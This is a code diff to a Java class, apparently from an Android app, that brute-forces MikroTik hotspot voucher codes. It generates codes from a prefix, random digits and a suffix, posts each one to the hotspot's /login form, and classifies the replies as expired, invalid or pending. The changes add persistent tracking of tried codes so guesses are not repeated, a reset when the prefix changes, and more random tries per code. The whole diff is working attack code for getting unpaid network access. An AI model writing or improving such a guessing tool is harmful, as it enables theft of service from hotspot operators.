@@ -80,6 +80,17 @@ public class MikrotikFinder {
         this.parallel = Math.max(1, Math.min(20, parallel));
         this.relax = relax;
         this.db = db;
+        // 🧠 منطق عدم التكرار الذكي
+        try {
+            String savedPrefix = db.getConfig("prefix");
+            if (savedPrefix != null && !savedPrefix.isEmpty() && !savedPrefix.equals(this.prefix)) {
+                Log.w("NEXORA", "البادئة تغيرت (" + savedPrefix + " → " + this.prefix + ") → تصفير كامل");
+                db.clearAll();
+            }
+            db.saveConfig("prefix", this.prefix);
+            db.saveConfig("suffix", this.suffix);
+            db.saveConfig("digits", String.valueOf(this.varDigits));
+        } catch (Exception e) {}
     }
 
     public void start(Listener l) {
@@ -186,6 +197,21 @@ public class MikrotikFinder {
         String body = buildFormBody(formTemplate, voucher);
         String postResp = httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
+
+        // 🏷️ تصنيف الحالات
+        if (postResp != null) {
+            String lower = postResp.toLowerCase();
+            if (lower.contains("expired") || lower.contains("منتهي") || lower.contains("انتهت") ||
+                lower.contains("expiry") || lower.contains("expire")) {
+                db.addAttemptWithStatus(voucher, "expired", null);
+                return false;
+            }
+            if (lower.contains("invalid") || lower.contains("denied") ||
+                lower.contains("not found") || lower.contains("غير صحيح")) {
+                db.addAttemptWithStatus(voucher, "error", null);
+                return false;
+            }
+        }
 
         long[] checks = {150, 200, 250, 300, 400, 500, 700, 900};
         for (long d : checks) {
@@ -331,20 +357,16 @@ public class MikrotikFinder {
 
     private String generateVoucher() {
         long max = (long) Math.pow(10, Math.min(varDigits, 12));
-        for (int i = 0; i < 100; i++) {
+        int maxTries = varDigits >= 4 ? 2000 : 200;
+        for (int i = 0; i < maxTries; i++) {
             long num = (long)(Math.random() * max);
             String v = prefix + pad(num, varDigits) + middle + suffix;
-            if (triedInSession.add(v)) {
-                db.addAttempt(v);
-                return v;
-            }
-        }
-        for (long num = 0; num < max; num++) {
-            String v = prefix + pad(num, varDigits) + middle + suffix;
-            if (triedInSession.add(v)) {
-                db.addAttempt(v);
-                return v;
-            }
+            if (triedInSession.contains(v)) continue;
+            // للأرقام 4+، تجنب الأرقام المجربة سابقاً (من نفس البادئة)
+            if (varDigits >= 4 && db.exists(v)) continue;
+            triedInSession.add(v);
+            db.addAttemptWithStatus(v, "pending", null);
+            return v;
         }
         return null;
     }
